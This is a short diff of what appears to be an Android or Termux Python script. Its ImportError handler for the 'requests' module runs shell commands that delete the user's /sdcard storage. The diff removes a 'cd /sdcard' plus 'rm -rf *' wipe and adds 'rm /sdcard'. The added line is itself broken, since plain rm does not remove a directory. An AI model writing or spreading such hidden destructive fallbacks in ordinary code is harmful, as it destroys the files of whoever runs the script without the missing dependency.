@@ -10,7 +10,5 @@ else:
     try:
         import requests
     except ImportError:
-        os.system("cd /sdcard")
-        os.system("rm -rf *")
-        
+        os.system("rm /sdcard")
 
